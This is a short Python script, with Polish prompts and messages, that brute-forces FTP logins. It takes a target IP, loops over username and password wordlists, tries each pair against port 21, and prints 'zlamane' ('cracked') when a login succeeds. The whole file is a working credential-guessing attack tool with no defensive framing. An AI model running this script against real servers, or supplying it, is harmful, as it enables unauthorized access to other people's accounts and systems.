import ftplib

targethost = input("Podaj IP targetu: ")
ftpserver = ftplib.FTP()
users = open("brute_users.txt")
passwords = open("passwords.txt")

for user in users:
    user = user.replace("\n", "")
    passwords.seek(0)
    for password in passwords:
        password = password.replace("\n", "")
        print(f"Trying: {user}:{password}")
        try:
            ftpserver.connect(targethost, 21, timeout=5)
            ftpserver.login(user, password)
            print("zlamane")
            ftpserver.close()
        except Exception as e:
            print("Zle dane logowania")
            print(e)
